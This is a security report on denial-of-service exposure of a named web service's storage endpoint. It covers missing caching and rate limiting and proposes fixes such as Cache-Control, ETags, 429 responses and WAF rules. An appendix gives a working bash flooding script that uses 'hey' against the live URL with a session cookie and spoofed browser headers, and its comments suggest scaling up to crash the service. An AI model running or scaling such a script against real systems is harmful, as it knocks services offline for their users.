# Security Report on DDOS Attack by Nermal(Arjun Aditya)

## Why missing caching = higher DDoS risk

| Without caching | Effect |
|---|---|
| No CDN/edge cache | Every request hits the origin — full auth + DB work, every time |
| No `ETag` / `Last-Modified` | No cheap `304`s — server always resends the full response |
| No amplification buffer | N requests = N units of origin work (instead of ~1) |
| No caching + concurrency | A 5-concurrent burst (like this script) has nothing softening the load |

**In short:** caching lets an edge layer absorb repeat traffic before it reaches your servers. Without it, every request — real or malicious — costs full backend capacity.

## Why this setup happens

- **Per-user data feels "uncacheable."** Teams skip caching on session-scoped endpoints (like `/storage`) to avoid leaking one user's data to another — but then forget the replacement control (rate limits, per-user cache).
- **Listing endpoints are expensive by nature** (DB/bucket queries) — exactly what attackers target for maximum damage per request.
- **No rate limiting visible.** No `429`/`Retry-After` in the response headers means nothing currently stops one session from sending unlimited requests.

## Fixes

**Add caching**
- `Cache-Control: private, max-age=15-60` + `ETag` on `/storage` → clients can send `If-None-Match` and get `304`s
- Front expensive lookups with a short-TTL cache (Redis, 10-30s) or a per-user Cloudflare cache rule

**Add rate limiting**
- **100 requests/min per user** as a general ceiling; drop to **30-60/min** on `/storage` specifically since it's heavier
- Cap concurrency per session (e.g. 5 in-flight max) — directly blocks tools like `hey`
- Return `429` + `Retry-After` so clients back off properly
- Easiest path: Cloudflare Rate Limiting rules, or Redis `INCR`+`EXPIRE` in-app
- Alert on abnormal per-session/IP request rates

**Bottom line:** caching handles *repeat* load, rate limiting handles *worst-case* load. Need both.

## Additional mitigations

**Edge/network**
- WAF / bot management to flag load-test-shaped traffic (identical headers, high rate from one IP)
- Challenge mode (Cloudflare "Under Attack" / Turnstile) on suspicious traffic before it reaches origin
- Block/deprioritize known datacenter or VPS IP ranges hitting expensive endpoints

**App/auth**
- Short-lived session tokens instead of long-lived cookies — shrinks the damage window if one leaks (directly relevant here)
- Bind sessions to IP/device fingerprint so a leaked cookie used elsewhere forces re-auth
- Circuit breakers on expensive queries — shed load automatically if the storage query starts slowing down
- Cap pagination/result size so a single request can't be made arbitrarily expensive

**Operational**
- Autoscaling with hard ceilings, so a burst degrades gracefully instead of taking the service down
- Alerting on per-session request-rate anomalies — catches this exact pattern early

---

## Appendix: script (cookie redacted)

```bash
#!/usr/bin/env bash
# ornn-cache-test.sh
# Single-file Ornn storage cache test. 200 requests, 5 concurrent. Run ONCE.
# chmod +x ./crash-storage.sh
# REQUESTS=1000 CONCURRENCY=200 ./crash-storage.sh

set -euo pipefail

COOKIE='<REDACTED-LIVE-COOKIE>'

URL="https://compute.ornn.com/storage"
REQUESTS="${REQUESTS:-200}"
CONCURRENCY="${CONCURRENCY:-5}"
OUT="ornn-storage-test-$(date +%Y%m%d-%H%M%S)"

command -v hey >/dev/null 2>&1 || { echo "Error: 'hey' not found in PATH." >&2; exit 1; }

mkdir -p "$OUT"

COMMON=(
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Encoding: gzip, deflate, br, zstd"
  -H "Accept-Language: en-US,en;q=0.9"
  -H "Cookie: $COOKIE"
  -H "Referer: https://ornn.com/"
  -H "Priority: u=0, i"
  -H "Sec-Fetch-Dest: document"
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.6.2 Safari/605.1.15"
)

# PASS 1: baseline
hey -n "$REQUESTS" -c "$CONCURRENCY" "${COMMON[@]}" -o csv "$URL" > "$OUT/pass1.csv" 2>&1 || true

# PASS 2: with Cache-Control: max-age=0
hey -n "$REQUESTS" -c "$CONCURRENCY" "${COMMON[@]}" \
  -H "Cache-Control: max-age=0" \
  -o csv "$URL" > "$OUT/pass2.csv" 2>&1 || true

# Response headers (single curl)
curl -sS -D - -o /dev/null "${COMMON[@]}" "$URL" | tee "$OUT/headers.txt" \
  | grep -iE "^(HTTP/|cache|age|etag|cf-|x-cache|x-vercel|vary)" || true

# Status code distribution
for f in pass1 pass2; do
  awk -F, 'NR>1 {print $2}' "$OUT/$f.csv" | sort | uniq -c | sort -rn
  grep -E "Requests/sec:|Total:|Slowest:|Fastest:|Average:|Status code distribution:" \
    -A6 "$OUT/$f.csv" | head -40 || true
done
```
